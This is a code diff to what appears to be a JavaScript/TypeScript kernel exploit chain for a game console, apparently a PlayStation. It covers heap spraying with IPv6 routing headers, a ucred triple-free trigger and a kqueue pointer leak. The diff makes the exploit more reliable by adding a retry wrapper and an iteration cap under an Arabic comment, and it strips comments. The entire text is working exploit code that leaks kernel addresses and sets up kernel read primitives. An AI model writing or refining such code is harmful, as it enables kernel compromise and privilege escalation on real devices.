@@ -1033,7 +1033,8 @@ function exploit_phase_trigger () {
 }
 
 function exploit_phase_leak () {
-  if (!leak_kqueue()) {
+  if (!leak_kqueue_safe()) {
+    log('[leak_kqueue_safe] failed, retrying...')
     yield_to_render(exploit_phase_trigger)
     return
   }
@@ -1460,24 +1461,23 @@ function trigger_ucred_triplefree () {
 }
 
 function leak_kqueue () {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
   debug('Leaking kqueue...')
 
-  // Free one.
   free_rthdr(ipv6_socks[triplets[1]])
 
-  // Leak kqueue.
   let kq = new BigInt(0)
 
-  // Minimizing footprint
   const magic_val = new BigInt(0x0, 0x1430000)
   const magic_add = leak_rthdr.add(0x08)
 
   let count = 0
-  while (count < KQUEUE_ITERATIONS) {
+  const MAX_KQ = 5000   // الحد الآمن الجديد
+
+  while (count < MAX_KQ) {
+    count++
+
     kq = kqueue()
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
 
     if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
@@ -1486,15 +1486,12 @@ function leak_kqueue () {
 
     close(kq)
     sched_yield()
-    count++
-  }
-  if (count === KQUEUE_ITERATIONS) {
-    // Dropped out with no kqueue leak
-    log('Failed to leak kqueue_fdp')
-    return false
   }
 
-  // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
+  if (count >= MAX_KQ) {
+    log('leak_kqueue: exceeded MAX_KQ iterations')
+    return false
+  }
 
   kl_lock = read64(leak_rthdr.add(0x60))
   kq_fdp = read64(leak_rthdr.add(0x98))
@@ -1506,17 +1503,21 @@ function leak_kqueue () {
 
   debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))
 
-  // for (i=0; i<0x100; i=i+8) {
-  //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
-  // }
-
-  // Close kqueue to free buffer.
   close(kq)
 
-  // Find new triplets[1]
   triplets[1] = find_triplet(triplets[0], triplets[2])
 
   return true
+}
+
+
+function leak_kqueue_safe() {
+  try {
+    return leak_kqueue()
+  } catch (e) {
+    log('leak_kqueue_safe ERROR: ' + (e as Error).message)
+    return false
+  }
 }
 
 function kreadslow64 (address: BigInt) {
